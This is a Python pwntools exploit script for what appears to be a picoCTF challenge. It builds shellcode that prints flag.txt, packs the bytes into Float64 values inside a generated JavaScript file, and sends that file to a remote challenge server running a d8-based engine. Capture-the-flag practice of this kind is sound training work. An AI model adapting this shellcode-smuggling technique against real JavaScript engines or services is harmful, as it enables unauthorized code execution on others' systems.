#!/usr/bin/env python3

from pwn import *

context.clear(arch="amd64", os="linux")


def conn():
    if args.LOCAL:
        r = process(['python3', './server.py'])
    else:
        r = remote('wily-courier.picoctf.net', 53965)

    return r


def main():
    # NOTE: We have to pad it to a multiple of 8 so the converstion
    # to 8-byte value written by us values works.
    # Also it's important to use 'exit_group' and not just 'exit' to
    # terminate correctly the entire process/thread group. Calling just
    # 'exit' would terminate the single thread, so if the 'd8' program
    # has other threads running, it will surely wait for them and
    # eventually timeout
    shellcode  = asm(shellcraft.cat('flag.txt') + shellcraft.exit_group(0))

    # Since '//' rounds down, adding 7 ensures that values that aren't
    # already divisible by 8 get pushed into the next integer division result.
    # For example, 51 // 8 * 8 = 48 which is incorrect for us, so we add 7 to
    # push it to the next division: 58 // 8 = 7 --> 7 * 8 = 56
    shellcode = shellcode.ljust((len(shellcode) + 7) // 8 * 8, b"\x90")

    # Convert the shellcode into an array of hex values
    byte_array = ", ".join(f"0x{byte:02x}" for byte in shellcode)

    # Write the javascript program to file
    javascript = f"""
    const buffer = new ArrayBuffer(8);
    const f64 = new Float64Array(buffer);
    const u8 = new Uint8Array(buffer);

    const shellcode = [{byte_array}];
    const payload = [];

    for (let i = 0; i < shellcode.length; i++) {{
        u8[i % 8] = shellcode[i];

        if (i % 8 === 7) {{
            payload.push(f64[0]);
        }}
    }}

    AssembleEngine(payload);
    """

    with open("exploit.js", "w") as file:
        file.write(javascript)

    print(f"Shellcode length: {len(shellcode)} bytes")
    print(f"JavaScript length: {len(javascript)} characters")

    r = conn()

    with open("exploit.js", "rb") as f:
        exploit = f.read()

        r.sendlineafter(b'5k:', str(len(exploit)).encode())
        r.sendlineafter(b'please!!\n', exploit)

        r.recvuntil(b"Stdout b'")
        flag = r.recvuntil(b"\\")[:-1]
        print(flag.decode())


if __name__ == '__main__':
    main()
